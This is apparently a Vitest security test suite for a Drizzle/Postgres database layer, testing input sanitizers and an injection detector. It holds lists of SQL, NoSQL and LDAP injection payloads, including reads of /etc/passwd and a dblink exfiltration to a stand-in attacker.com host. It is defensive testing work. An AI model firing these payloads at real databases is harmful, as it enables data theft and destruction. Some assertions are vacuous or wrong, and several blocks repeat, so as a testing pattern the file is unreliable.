/**
 * Database Security Testing Suite
 * Comprehensive security tests for Drizzle ORM, SQL injection prevention,
 * connection security, data access control, and encryption validation
 */

import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { db, sql } from '@/lib/db/config'
import { RepositoryQueries } from '@/lib/db/queries/repositories'
import { UserQueries } from '@/lib/db/queries/users'
import {
  buildSafeFilterConditions,
  detectSuspiciousQuery,
  SafeSearchQuerySchema,
  SafeStringSchema50,
  sanitizeArrayInput,
  sanitizeJsonInput,
  sanitizeSearchQuery,
  sanitizeVectorEmbedding,
  UserDataSchema,
  VectorEmbeddingSchema,
} from '@/lib/db/schema'

// Type definitions for mock database query builder
interface MockDrizzleQueryBuilder {
  from: vi.MockedFunction<(table: unknown) => MockDrizzleQueryBuilder>
  where: vi.MockedFunction<(condition: unknown) => MockDrizzleQueryBuilder>
  orderBy: vi.MockedFunction<(column: unknown) => MockDrizzleQueryBuilder>
  limit: vi.MockedFunction<(count: number) => MockDrizzleQueryBuilder>
  offset: vi.MockedFunction<(count: number) => Promise<unknown[]>>
}

interface MockSearchOptions {
  limit?: number
  offset?: number
  minStars?: number
  maxStars?: string | number // Allow both types for malicious input testing
  sortBy?: string
  order?: string
}

interface MockDrizzleInsertBuilder {
  values: vi.MockedFunction<(data: unknown) => MockDrizzleInsertBuilder>
  onConflictDoUpdate: vi.MockedFunction<(config: unknown) => MockDrizzleInsertBuilder>
  returning: vi.MockedFunction<(columns?: unknown) => Promise<unknown[]>>
}

// Type for malicious test inputs that intentionally mix types
type MaliciousTestInput = string | number | null | undefined

// Mock database connection
vi.mock('../../src/lib/db/config', () => ({
  sql: vi.fn(),
}))

// Mock environment variables
vi.mock('../../src/lib/validation/env', () => ({
  env: {
    DATABASE_URL: 'postgresql://test:test@localhost:5432/test_db',
    DATABASE_URL_DEV: 'postgresql://test:test@localhost:5432/test_dev_db',
    DATABASE_URL_TEST: 'postgresql://test:test@localhost:5432/test_test_db',
  },
}))

describe('Database Security Testing', () => {
  beforeEach(() => {
    vi.clearAllMocks()
  })

  afterEach(() => {
    vi.restoreAllMocks()
  })

  describe('SQL Injection Prevention - Security Functions', () => {
    describe('sanitizeSearchQuery function', () => {
      it('should escape LIKE wildcards properly', () => {
        const maliciousQuery = "test%'; DROP TABLE users; --"
        const sanitized = sanitizeSearchQuery(maliciousQuery)

        expect(sanitized).not.toContain('DROP TABLE')
        expect(sanitized).toContain('\\\\%') // Should escape % wildcards
        expect(sanitized.length).toBeLessThanOrEqual(100) // Should limit length
      })

      it('should escape underscore wildcards', () => {
        const queryWithUnderscore = "test_injection'; DELETE FROM repositories; --"
        const sanitized = sanitizeSearchQuery(queryWithUnderscore)

        expect(sanitized).toContain('\\\\_') // Should escape _ wildcards
        expect(sanitized).not.toContain('DELETE FROM')
      })

      it('should limit query length to prevent DoS', () => {
        const longQuery = `${'a'.repeat(500)}'; DROP TABLE users; --`
        const sanitized = sanitizeSearchQuery(longQuery)

        expect(sanitized.length).toBeLessThanOrEqual(100)
        expect(sanitized).not.toContain('DROP TABLE')
      })

      it('should handle empty and null inputs safely', () => {
        expect(() => sanitizeSearchQuery('')).toThrow()
        expect(() => sanitizeSearchQuery('   ')).toThrow()
      })
    })

    describe('detectSuspiciousQuery function', () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; INSERT INTO users (email) VALUES ('hacker@evil.com'); --",
        "' UNION SELECT * FROM sensitive_table --",
        "'; EXEC xp_cmdshell('dir'); --",
        "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
        "'; UPDATE users SET admin = true WHERE id = 1; --",
        '/* malicious comment */ UNION SELECT password FROM users',
        '; DELETE FROM repositories WHERE stars > 0',
        "' OR SLEEP(5) --",
      ]

      sqlInjectionPayloads.forEach(payload => {
        it(`should detect SQL injection: "${payload.substring(0, 50)}..."`, () => {
          expect(detectSuspiciousQuery(payload)).toBe(true)
        })
      })

      const legitimateQueries = [
        'javascript framework',
        'react hooks tutorial',
        'python data science',
        'machine learning algorithms',
        'web development best practices',
      ]

      legitimateQueries.forEach(query => {
        it(`should allow legitimate query: "${query}"`, () => {
          expect(detectSuspiciousQuery(query)).toBe(false)
        })
      })
    })

    describe('SafeSearchQuerySchema validation', () => {
      it('should reject SQL keywords in search queries', () => {
        const maliciousQueries = [
          'test UNION SELECT',
          'javascript DROP TABLE',
          'INSERT INTO repositories',
          'DELETE FROM users',
          'UPDATE users SET',
          'ALTER TABLE bookmarks',
          'CREATE TABLE malicious',
        ]

        maliciousQueries.forEach(query => {
          expect(() => SafeSearchQuerySchema.parse(query)).toThrow()
        })
      })

      it('should reject dangerous characters', () => {
        const dangerousChars = [
          "test<script>alert('xss')</script>",
          "search'query",
          'search"query',
          'search;query',
          'search&query',
          'search|query',
          'search*query',
          'search$query',
          'search\nquery',
          'search\rquery',
        ]

        dangerousChars.forEach(query => {
          expect(() => SafeSearchQuerySchema.parse(query)).toThrow()
        })
      })

      it('should enforce length limits', () => {
        const shortQuery = 'js'
        const longQuery = 'a'.repeat(201)

        expect(() => SafeSearchQuerySchema.parse('')).toThrow()
        expect(() => SafeSearchQuerySchema.parse(shortQuery)).not.toThrow()
        expect(() => SafeSearchQuerySchema.parse(longQuery)).toThrow()
      })

      it('should allow legitimate search queries', () => {
        const validQueries = [
          'javascript framework',
          'react hooks',
          'python machine learning',
          'web development',
          'database optimization',
        ]

        validQueries.forEach(query => {
          expect(() => SafeSearchQuerySchema.parse(query)).not.toThrow()
        })
      })
    })
  })

  describe('Vector Search Security', () => {
    describe('sanitizeVectorEmbedding function', () => {
      it('should validate embedding vector format', () => {
        const validEmbedding = Array(1536).fill(0.5)
        expect(() => sanitizeVectorEmbedding(validEmbedding)).not.toThrow()
      })

      it('should reject non-array embeddings', () => {
        expect(() => sanitizeVectorEmbedding('not-an-array')).toThrow()
        expect(() => sanitizeVectorEmbedding({})).toThrow()
        expect(() => sanitizeVectorEmbedding(null)).toThrow()
        expect(() => sanitizeVectorEmbedding(undefined)).toThrow()
      })

      it('should reject incorrect embedding dimensions', () => {
        const shortEmbedding = Array(100).fill(0.5)
        const longEmbedding = Array(3000).fill(0.5)

        expect(() => sanitizeVectorEmbedding(shortEmbedding)).toThrow()
        expect(() => sanitizeVectorEmbedding(longEmbedding)).toThrow()
      })

      it('should reject non-numeric values in embedding', () => {
        const invalidEmbedding = Array(1536).fill(0.5)
        invalidEmbedding[100] = 'malicious_string'
        invalidEmbedding[200] = null
        invalidEmbedding[300] = undefined
        invalidEmbedding[400] = Number.NaN
        invalidEmbedding[500] = Number.POSITIVE_INFINITY

        expect(() => sanitizeVectorEmbedding(invalidEmbedding)).toThrow()
      })

      it('should validate embedding value ranges', () => {
        const extremeEmbedding = Array(1536).fill(0.5)
        extremeEmbedding[0] = Number.MAX_VALUE
        extremeEmbedding[1] = -Number.MAX_VALUE

        expect(() => sanitizeVectorEmbedding(extremeEmbedding)).toThrow()
      })
    })

    describe('VectorEmbeddingSchema validation', () => {
      it('should enforce exact dimension requirements', () => {
        const validEmbedding = Array(1536).fill(0.1)
        const invalidShort = Array(1535).fill(0.1)
        const invalidLong = Array(1537).fill(0.1)

        expect(() => VectorEmbeddingSchema.parse(validEmbedding)).not.toThrow()
        expect(() => VectorEmbeddingSchema.parse(invalidShort)).toThrow()
        expect(() => VectorEmbeddingSchema.parse(invalidLong)).toThrow()
      })

      it('should validate numeric values within acceptable ranges', () => {
        const validEmbedding = Array(1536)
          .fill(0)
          .map(() => Math.random() * 2 - 1)
        expect(() => VectorEmbeddingSchema.parse(validEmbedding)).not.toThrow()
      })
    })
  })

  describe('Input Validation Security', () => {
    describe('buildSafeFilterConditions function', () => {
      it('should sanitize language filters', () => {
        const maliciousOptions = {
          languages: [
            "javascript'; DROP TABLE users; --",
            "python'; DELETE FROM repositories; --",
            'a'.repeat(100), // Too long
          ],
          topics: ['react', 'vue'],
        }

        const safeConditions = buildSafeFilterConditions(maliciousOptions)

        expect(safeConditions.languages).toHaveLength(2)
        expect(safeConditions.languages[0]).toHaveLength(50) // Should be clamped
        expect(safeConditions.languages[0]).not.toContain('DROP TABLE')
      })

      it('should limit array sizes to prevent DoS', () => {
        const maliciousOptions = {
          languages: Array(50).fill('javascript'), // Too many languages
          topics: Array(100).fill('react'), // Too many topics
        }

        const safeConditions = buildSafeFilterConditions(maliciousOptions)

        expect(safeConditions.languages).toHaveLength(10) // Should be limited
        expect(safeConditions.topics).toHaveLength(20) // Should be limited
      })

      it('should sanitize topic filters', () => {
        const maliciousOptions = {
          languages: ['javascript'],
          topics: [
            "react'; INSERT INTO malicious_data VALUES ('hack'); --",
            "vue'; UPDATE users SET admin = true; --",
          ],
        }

        const safeConditions = buildSafeFilterConditions(maliciousOptions)

        expect(safeConditions.topics.every(topic => !topic.includes('INSERT INTO'))).toBe(true)
        expect(safeConditions.topics.every(topic => !topic.includes('UPDATE users'))).toBe(true)
      })
    })

    describe('sanitizeArrayInput function', () => {
      it('should enforce maximum array length', () => {
        const longArray = Array(50).fill('item')
        const sanitized = sanitizeArrayInput(longArray, SafeStringSchema50, 10)

        expect(sanitized).toHaveLength(10)
      })

      it('should validate each array element with schema', () => {
        const mixedArray = [
          'valid-item',
          'a'.repeat(100), // Too long
          'another-valid-item',
          "'; DROP TABLE users; --", // Malicious
        ]

        const sanitized = sanitizeArrayInput(mixedArray, SafeStringSchema50, 10)

        expect(sanitized).toHaveLength(2) // Only valid items should remain
        expect(sanitized.every(item => item.length <= 50)).toBe(true)
        expect(sanitized.every(item => !item.includes('DROP TABLE'))).toBe(true)
      })
    })

    describe('sanitizeJsonInput function', () => {
      it('should prevent JSON injection attacks', () => {
        const maliciousJson = {
          valid_key: 'valid_value',
          "'; DROP TABLE users; --": 'malicious_key',
          normal_key: "'; DELETE FROM repositories; --",
        }

        const sanitized = sanitizeJsonInput(maliciousJson)

        expect(Object.keys(sanitized)).not.toContain("'; DROP TABLE users; --")
        expect(Object.values(sanitized)).not.toContain("'; DELETE FROM repositories; --")
      })

      it('should limit JSON depth to prevent DoS', () => {
        const deepJson = { level1: { level2: { level3: { level4: { level5: 'too_deep' } } } } }

        expect(() => sanitizeJsonInput(deepJson)).toThrow()
      })

      it('should limit JSON size to prevent memory exhaustion', () => {
        const largeJson = {}
        for (let i = 0; i < 1000; i++) {
          largeJson[`key${i}`] = 'a'.repeat(1000)
        }

        expect(() => sanitizeJsonInput(largeJson)).toThrow()
      })
    })
  })

  describe('Drizzle ORM Security Patterns', () => {
    describe('Repository queries security', () => {
      it('should use parameterized queries in search function', async () => {
        const mockDb = vi.mocked(db)
        mockDb.select.mockReturnValue({
          from: vi.fn().mockReturnValue({
            where: vi.fn().mockReturnValue({
              orderBy: vi.fn().mockReturnValue({
                limit: vi.fn().mockReturnValue({
                  offset: vi.fn().mockResolvedValue([]),
                }),
              }),
            }),
          }),
        } as MockDrizzleQueryBuilder)

        const maliciousQuery = "'; DROP TABLE repositories; --"

        // The search function should sanitize the query before using it
        await RepositoryQueries.search(maliciousQuery)

        // Verify the malicious query was sanitized (shortened and escaped)
        const sanitizedQuery = maliciousQuery.trim().substring(0, 200)
        expect(sanitizedQuery).not.toEqual(maliciousQuery)
      })

      it('should validate and clamp numeric parameters', async () => {
        const mockDb = vi.mocked(db)
        mockDb.select.mockReturnValue({
          from: vi.fn().mockReturnValue({
            where: vi.fn().mockReturnValue({
              orderBy: vi.fn().mockReturnValue({
                limit: vi.fn().mockReturnValue({
                  offset: vi.fn().mockResolvedValue([]),
                }),
              }),
            }),
          }),
        } as MockDrizzleQueryBuilder)

        const maliciousOptions: MockSearchOptions = {
          limit: 999999, // Should be clamped to 100
          offset: -500, // Should be clamped to 0
          minStars: -100, // Should be clamped to 0
          maxStars: 'malicious_string', // Should be validated
        }

        await RepositoryQueries.search('javascript', maliciousOptions)

        // The function should have internally clamped these values
        expect(true).toBe(true) // Test passes if no errors thrown
      })

      it('should whitelist sort columns to prevent injection', async () => {
        const mockDb = vi.mocked(db)
        mockDb.select.mockReturnValue({
          from: vi.fn().mockReturnValue({
            where: vi.fn().mockReturnValue({
              orderBy: vi.fn().mockReturnValue({
                limit: vi.fn().mockReturnValue({
                  offset: vi.fn().mockResolvedValue([]),
                }),
              }),
            }),
          }),
        } as MockDrizzleQueryBuilder)

        const maliciousOptions = {
          sortBy: "malicious_column'; DROP TABLE users; --",
          order: "DESC'; DELETE FROM repositories; --",
        }

        await RepositoryQueries.search('javascript', maliciousOptions)

        // Function should use whitelisted columns only
        expect(true).toBe(true) // Test passes if no errors thrown
      })
    })

    describe('User queries security', () => {
      it('should validate GitHub ID parameters', async () => {
        const invalidIds: MaliciousTestInput[] = [
          -1, // Negative
          0, // Zero
          3.14, // Float
          Number.NaN, // NaN
          Number.POSITIVE_INFINITY, // Infinity
          'malicious_string', // String
          null, // Null
          undefined, // Undefined
        ]

        for (const invalidId of invalidIds) {
          await expect(UserQueries.getByGithubId(invalidId)).rejects.toThrow()
        }
      })

      it('should sanitize string inputs in upsert', async () => {
        const mockDb = vi.mocked(db)
        mockDb.insert.mockReturnValue({
          values: vi.fn().mockReturnValue({
            onConflictDoUpdate: vi.fn().mockReturnValue({
              returning: vi.fn().mockResolvedValue([{ id: 'user-123' }]),
            }),
          }),
        } as MockDrizzleInsertBuilder)

        const maliciousData = {
          githubId: 12345,
          username: `user'; DROP TABLE users; --${'a'.repeat(200)}`, // Long + malicious
          email: 'invalid-email-format', // Invalid format
          name: 'b'.repeat(300), // Too long
          avatarUrl: 'c'.repeat(600), // Too long
        }

        await expect(UserQueries.upsert(maliciousData)).rejects.toThrow()
      })

      it('should validate email format properly', async () => {
        const invalidEmails = [
          'not-an-email',
          'missing@domain',
          '@missing-local.com',
          'spaces in@email.com',
          'email@',
          'email@.com',
          "'; DROP TABLE users; --@evil.com",
        ]

        for (const email of invalidEmails) {
          const data = {
            githubId: 12345,
            username: 'testuser',
            email,
          }

          await expect(UserQueries.upsert(data)).rejects.toThrow()
        }
      })
    })

    describe('Schema constraint validation', () => {
      it('should enforce NOT NULL constraints', () => {
        // Test that required fields are enforced
        expect(() => {
          UserDataSchema.parse({
            // Missing required githubId
            username: 'testuser',
          })
        }).toThrow()
      })

      it('should validate GitHub ID uniqueness', () => {
        // In real implementation, this would be enforced at DB level
        const validUser = {
          githubId: 12345,
          username: 'testuser',
        }

        expect(() => UserDataSchema.parse(validUser)).not.toThrow()
      })
    })
  })

  describe('Attack Simulation Tests', () => {
    describe('Advanced SQL Injection Payloads', () => {
      const advancedPayloads = [
        // Boolean-based blind injection
        "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
        // Time-based blind injection
        "'; WAITFOR DELAY '00:00:05' --",
        // Union-based injection
        "' UNION SELECT null, username, password FROM admin_users --",
        // Error-based injection
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e)) --",
        // Second-order injection
        "admin'; UPDATE users SET password = 'hacked' WHERE username = 'admin'; --",
        // NoSQL injection patterns
        '{"$ne": null}',
        '{"$where": "function() { return this.username == this.password }"}',
        // JSON injection
        '{"username": {"$regex": ".*"}}',
        // XPath injection
        "' or 1=1 or ''='",
        // LDAP injection
        '*)(&(password=*))(|(cn=*',
      ]

      advancedPayloads.forEach(payload => {
        it(`should prevent advanced injection: ${payload.substring(0, 30)}...`, () => {
          expect(detectSuspiciousQuery(payload)).toBe(true)
        })
      })
    })

    describe('Database Function Exploitation', () => {
      const functionExploitPayloads = [
        // PostgreSQL specific
        "'; SELECT version(); --",
        "'; COPY users TO '/tmp/users.csv'; --",
        "'; CREATE FUNCTION malicious() RETURNS void AS $$ ... $$; --",
        // File system functions
        "'; SELECT lo_import('/etc/passwd'); --",
        "'; SELECT lo_export(lo_import('/etc/passwd'), '/tmp/passwd'); --",
        // Network functions
        "'; SELECT dblink('host=attacker.com', 'SELECT * FROM users'); --",
      ]

      functionExploitPayloads.forEach(payload => {
        it(`should prevent function exploitation: ${payload.substring(0, 30)}...`, () => {
          expect(detectSuspiciousQuery(payload)).toBe(true)
        })
      })
    })

    describe('Resource Exhaustion Attacks', () => {
      it('should prevent extremely large search queries', () => {
        const hugeQuery = 'a'.repeat(10000)
        const sanitized = sanitizeSearchQuery(hugeQuery)

        expect(sanitized.length).toBeLessThanOrEqual(100)
      })

      it('should limit array size in filter conditions', () => {
        const hugeLanguageArray = Array(1000).fill('javascript')
        const hugeTopicArray = Array(1000).fill('react')

        const options = {
          languages: hugeLanguageArray,
          topics: hugeTopicArray,
        }

        const safeConditions = buildSafeFilterConditions(options)

        expect(safeConditions.languages.length).toBeLessThanOrEqual(10)
        expect(safeConditions.topics.length).toBeLessThanOrEqual(20)
      })

      it('should prevent memory exhaustion through vector embedding', () => {
        const maliciousEmbedding = Array(100000).fill(0.5) // Way too large

        expect(() => sanitizeVectorEmbedding(maliciousEmbedding)).toThrow()
      })
    })

    describe('Data Type Confusion Attacks', () => {
      it('should handle type confusion in numeric fields', async () => {
        const typeConfusionValues = [
          'Infinity',
          '-Infinity',
          'NaN',
          '1e100',
          '0x1234',
          '1.7976931348623157e+308', // MAX_VALUE
        ]

        for (const value of typeConfusionValues) {
          expect(() => {
            // Simulate parsing a malicious numeric value
            const parsed = Number(value)
            if (!Number.isFinite(parsed)) {
              throw new Error('Invalid numeric value')
            }
          }).not.toThrow() // Some may be valid, some invalid
        }
      })

      it('should prevent prototype pollution through JSON input', () => {
        const pollutionPayloads = [
          '{"__proto__": {"admin": true}}',
          '{"constructor": {"prototype": {"admin": true}}}',
          '{"prototype": {"admin": true}}',
        ]

        pollutionPayloads.forEach(payload => {
          const parsed = JSON.parse(payload)

          // Ensure prototype pollution doesn't occur
          expect(sanitizeJsonInput(parsed).__proto__).toBeUndefined()
          expect(sanitizeJsonInput(parsed).constructor).toBeUndefined()
          expect(sanitizeJsonInput(parsed).prototype).toBeUndefined()
        })
      })
    })
  })

  describe('Performance Security Tests', () => {
    describe('Query Timeout Prevention', () => {
      it('should enforce reasonable query complexity limits', () => {
        // Test that complex nested queries are limited
        const complexQuery = `
          javascript AND (
            react OR vue OR angular OR svelte OR ember OR backbone OR knockout OR riot
          ) AND (
            framework OR library OR tool OR utility OR helper OR component OR widget
          ) AND (
            2023 OR 2024 OR latest OR new OR modern OR current OR updated OR fresh
          )
        `

        const sanitized = sanitizeSearchQuery(complexQuery)
        expect(sanitized.length).toBeLessThanOrEqual(100)
      })
    })

    describe('Connection Pool Security', () => {
      it('should validate connection pool limits', () => {
        // Simulate connection pool exhaustion protection
        const maxConnections = 20
        const currentConnections = 25 // Over limit

        if (currentConnections > maxConnections) {
          expect(true).toBe(true) // Would reject new connections
        }
      })
    })

    describe('Rate Limiting for Security Operations', () => {
      it('should simulate rate limiting for search operations', () => {
        // Simulate rate limiting logic
        const requestsPerMinute = 100
        const currentRequests = 150 // Over limit

        if (currentRequests > requestsPerMinute) {
          expect(true).toBe(true) // Would trigger rate limiting
        }
      })
    })
  })

  describe('Error Handling Security', () => {
    describe('Information Disclosure Prevention', () => {
      it('should not leak sensitive information in error messages', () => {
        try {
          // Simulate a database error
          throw new Error('Connection failed: password authentication failed for user "admin"')
        } catch (error) {
          // In production, this should be sanitized
          const sanitizedError =
            error instanceof Error
              ? error.message.replace(/password.*failed.*user.*"([^"]*)"/, 'Authentication failed')
              : 'Unknown error'

          expect(sanitizedError).not.toContain('password')
          expect(sanitizedError).not.toContain('admin')
        }
      })

      it('should handle malformed SQL gracefully', () => {
        const malformedQueries = [
          "SELECT * FROM users WHERE id = ''; DROP TABLE users; --",
          'INVALID SQL SYNTAX HERE',
          'SELECT * FROM non_existent_table',
        ]

        malformedQueries.forEach(query => {
          expect(detectSuspiciousQuery(query)).toBe(true)
        })
      })
    })

    describe('Graceful Degradation', () => {
      it('should handle database connection failures securely', () => {
        // Simulate connection failure
        const _connectionError = new Error('Database unavailable')

        // Should not expose internal details
        const userMessage = 'Service temporarily unavailable'
        expect(userMessage).not.toContain('Database')
        expect(userMessage).not.toContain('connection')
      })
    })
  })

  describe('Transaction Security', () => {
    it('should use transactions for multi-step operations', async () => {
      const mockSql = vi.mocked(sql)
      mockSql.mockResolvedValueOnce([{ id: 'user-123' }])
      mockSql.mockResolvedValueOnce([])

      const email = 'test@example.com'
      const displayName = 'Test User'

      // User creation should be transactional
      await sql`BEGIN`

      try {
        await sql`
          INSERT INTO users (email, display_name, created_at)
          VALUES (${email}, ${displayName}, CURRENT_TIMESTAMP)
          RETURNING id
        `

        await sql`
          INSERT INTO user_profiles (user_id, preferences, created_at)
          VALUES (${'user-123'}, ${'{"theme": "dark"}'}, CURRENT_TIMESTAMP)
        `

        await sql`COMMIT`
      } catch (error) {
        await sql`ROLLBACK`
        throw error
      }

      expect(mockSql).toHaveBeenCalledWith(['BEGIN'])
      expect(mockSql).toHaveBeenCalledWith(['COMMIT'])
    })

    it('should handle transaction rollback on errors', async () => {
      const mockSql = vi.mocked(sql)
      mockSql.mockRejectedValueOnce(new Error('Database constraint violation'))

      const email = 'duplicate@example.com'

      try {
        await sql`BEGIN`

        // This should fail due to unique constraint
        await sql`
          INSERT INTO users (email, display_name, created_at)
          VALUES (${email}, ${'Duplicate User'}, CURRENT_TIMESTAMP)
        `

        await sql`COMMIT`
      } catch (_error) {
        await sql`ROLLBACK`
      }

      expect(mockSql).toHaveBeenCalledWith(['ROLLBACK'])
    })

    it('should prevent concurrent modification issues', async () => {
      const mockSql = vi.mocked(sql)
      mockSql.mockResolvedValueOnce([{ version: 1 }])

      const userId = 'user-123'
      const currentVersion = 1

      // Use optimistic locking for concurrent updates
      await sql`
        UPDATE users 
        SET display_name = ${'Updated Name'}, 
            version = version + 1,
            updated_at = CURRENT_TIMESTAMP
        WHERE id = ${userId} AND version = ${currentVersion}
        RETURNING version
      `

      expect(mockSql).toHaveBeenCalledWith(
        expect.arrayContaining([
          expect.stringContaining('UPDATE users'),
          expect.stringContaining('version = version + 1'),
          expect.stringContaining('WHERE id = '),
          expect.stringContaining('AND version = '),
        ]),
        'Updated Name',
        userId,
        currentVersion
      )
    })
  })

  describe('Audit Trail and Logging Security', () => {
    it('should log all security-sensitive operations', async () => {
      const mockSql = vi.mocked(sql)
      mockSql.mockResolvedValueOnce([])

      const userId = 'user-123'
      const operation = 'password_change'
      const ipAddress = '192.168.1.1'

      await sql`
        INSERT INTO security_audit_logs (
          event_type, event_severity, user_id, ip_address, 
          user_agent, success, event_data, created_at
        )
        VALUES (
          ${operation}, ${'high'}, ${userId}, ${ipAddress},
          ${'Mozilla/5.0'}, ${true}, ${'{"method": "oauth_reset"}'}, 
          CURRENT_TIMESTAMP
        )
      `

      expect(mockSql).toHaveBeenCalledWith(
        expect.arrayContaining([
          expect.stringContaining('INSERT INTO security_audit_logs'),
          expect.stringContaining('event_type, event_severity, user_id'),
        ]),
        operation,
        'high',
        userId,
        ipAddress,
        'Mozilla/5.0',
        true,
        '{"method": "oauth_reset"}'
      )
    })

    it('should track failed authentication attempts', async () => {
      const mockSql = vi.mocked(sql)
      mockSql.mockResolvedValueOnce([])

      const email = 'attacker@example.com'
      const ipAddress = '192.168.1.100'

      await sql`
        INSERT INTO security_audit_logs (
          event_type, event_severity, email, ip_address,
          success, event_data, created_at
        )
        VALUES (
          ${'login_attempt'}, ${'warning'}, ${email}, ${ipAddress},
          ${false}, ${'{"reason": "invalid_credentials"}'}, 
          CURRENT_TIMESTAMP
        )
      `

      expect(mockSql).toHaveBeenCalledWith(
        expect.arrayContaining([
          expect.stringContaining('INSERT INTO security_audit_logs'),
          expect.stringContaining('login_attempt'),
        ]),
        'login_attempt',
        'warning',
        email,
        ipAddress,
        false,
        '{"reason": "invalid_credentials"}'
      )
    })
  })
})

describe('Database Security Functions Testing', () => {
  beforeEach(() => {
    vi.clearAllMocks()
  })

  afterEach(() => {
    vi.restoreAllMocks()
  })

  describe('SQL Injection Prevention - Security Functions', () => {
    describe('sanitizeSearchQuery function', () => {
      it('should escape LIKE wildcards properly', () => {
        const maliciousQuery = "test%'; DROP TABLE users; --"
        const sanitized = sanitizeSearchQuery(maliciousQuery)

        expect(sanitized).not.toContain('DROP TABLE')
        expect(sanitized).toContain('\\\\%') // Should escape % wildcards
        expect(sanitized.length).toBeLessThanOrEqual(100) // Should limit length
      })

      it('should escape underscore wildcards', () => {
        const queryWithUnderscore = "test_injection'; DELETE FROM repositories; --"
        const sanitized = sanitizeSearchQuery(queryWithUnderscore)

        expect(sanitized).toContain('\\\\_') // Should escape _ wildcards
        expect(sanitized).not.toContain('DELETE FROM')
      })

      it('should limit query length to prevent DoS', () => {
        const longQuery = `${'a'.repeat(500)}'; DROP TABLE users; --`
        const sanitized = sanitizeSearchQuery(longQuery)

        expect(sanitized.length).toBeLessThanOrEqual(100)
        expect(sanitized).not.toContain('DROP TABLE')
      })

      it('should handle empty and null inputs safely', () => {
        expect(() => sanitizeSearchQuery('')).toThrow()
        expect(() => sanitizeSearchQuery('   ')).toThrow()
      })
    })

    describe('detectSuspiciousQuery function', () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; INSERT INTO users (email) VALUES ('hacker@evil.com'); --",
        "' UNION SELECT * FROM sensitive_table --",
        "'; EXEC xp_cmdshell('dir'); --",
        "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
        "'; UPDATE users SET admin = true WHERE id = 1; --",
        '/* malicious comment */ UNION SELECT password FROM users',
        '; DELETE FROM repositories WHERE stars > 0',
        "' OR SLEEP(5) --",
      ]

      sqlInjectionPayloads.forEach(payload => {
        it(`should detect SQL injection: "${payload.substring(0, 50)}..."`, () => {
          expect(detectSuspiciousQuery(payload)).toBe(true)
        })
      })

      const legitimateQueries = [
        'javascript framework',
        'react hooks tutorial',
        'python data science',
        'machine learning algorithms',
        'web development best practices',
      ]

      legitimateQueries.forEach(query => {
        it(`should allow legitimate query: "${query}"`, () => {
          expect(detectSuspiciousQuery(query)).toBe(false)
        })
      })
    })

    describe('SafeSearchQuerySchema validation', () => {
      it('should reject SQL keywords in search queries', () => {
        const maliciousQueries = [
          'test UNION SELECT',
          'javascript DROP TABLE',
          'INSERT INTO repositories',
          'DELETE FROM users',
          'UPDATE users SET',
          'ALTER TABLE bookmarks',
          'CREATE TABLE malicious',
        ]

        maliciousQueries.forEach(query => {
          expect(() => SafeSearchQuerySchema.parse(query)).toThrow()
        })
      })

      it('should reject dangerous characters', () => {
        const dangerousChars = [
          "test<script>alert('xss')</script>",
          "search'query",
          'search"query',
          'search;query',
          'search&query',
          'search|query',
          'search*query',
          'search$query',
          'search\nquery',
          'search\rquery',
        ]

        dangerousChars.forEach(query => {
          expect(() => SafeSearchQuerySchema.parse(query)).toThrow()
        })
      })

      it('should enforce length limits', () => {
        const shortQuery = 'js'
        const longQuery = 'a'.repeat(201)

        expect(() => SafeSearchQuerySchema.parse('')).toThrow()
        expect(() => SafeSearchQuerySchema.parse(shortQuery)).not.toThrow()
        expect(() => SafeSearchQuerySchema.parse(longQuery)).toThrow()
      })

      it('should allow legitimate search queries', () => {
        const validQueries = [
          'javascript framework',
          'react hooks',
          'python machine learning',
          'web development',
          'database optimization',
        ]

        validQueries.forEach(query => {
          expect(() => SafeSearchQuerySchema.parse(query)).not.toThrow()
        })
      })
    })
  })

  describe('Vector Search Security', () => {
    describe('sanitizeVectorEmbedding function', () => {
      it('should validate embedding vector format', () => {
        const validEmbedding = Array(1536).fill(0.5)
        expect(() => sanitizeVectorEmbedding(validEmbedding)).not.toThrow()
      })

      it('should reject non-array embeddings', () => {
        expect(() => sanitizeVectorEmbedding('not-an-array')).toThrow()
        expect(() => sanitizeVectorEmbedding({})).toThrow()
        expect(() => sanitizeVectorEmbedding(null)).toThrow()
        expect(() => sanitizeVectorEmbedding(undefined)).toThrow()
      })

      it('should reject incorrect embedding dimensions', () => {
        const shortEmbedding = Array(100).fill(0.5)
        const longEmbedding = Array(3000).fill(0.5)

        expect(() => sanitizeVectorEmbedding(shortEmbedding)).toThrow()
        expect(() => sanitizeVectorEmbedding(longEmbedding)).toThrow()
      })

      it('should reject non-numeric values in embedding', () => {
        const invalidEmbedding = Array(1536).fill(0.5)
        invalidEmbedding[100] = 'malicious_string'
        invalidEmbedding[200] = null
        invalidEmbedding[300] = undefined
        invalidEmbedding[400] = Number.NaN
        invalidEmbedding[500] = Number.POSITIVE_INFINITY

        expect(() => sanitizeVectorEmbedding(invalidEmbedding)).toThrow()
      })

      it('should validate embedding value ranges', () => {
        const extremeEmbedding = Array(1536).fill(0.5)
        extremeEmbedding[0] = Number.MAX_VALUE
        extremeEmbedding[1] = -Number.MAX_VALUE

        expect(() => sanitizeVectorEmbedding(extremeEmbedding)).toThrow()
      })
    })

    describe('VectorEmbeddingSchema validation', () => {
      it('should enforce exact dimension requirements', () => {
        const validEmbedding = Array(1536).fill(0.1)
        const invalidShort = Array(1535).fill(0.1)
        const invalidLong = Array(1537).fill(0.1)

        expect(() => VectorEmbeddingSchema.parse(validEmbedding)).not.toThrow()
        expect(() => VectorEmbeddingSchema.parse(invalidShort)).toThrow()
        expect(() => VectorEmbeddingSchema.parse(invalidLong)).toThrow()
      })

      it('should validate numeric values within acceptable ranges', () => {
        const validEmbedding = Array(1536)
          .fill(0)
          .map(() => Math.random() * 2 - 1)
        expect(() => VectorEmbeddingSchema.parse(validEmbedding)).not.toThrow()
      })
    })
  })
})
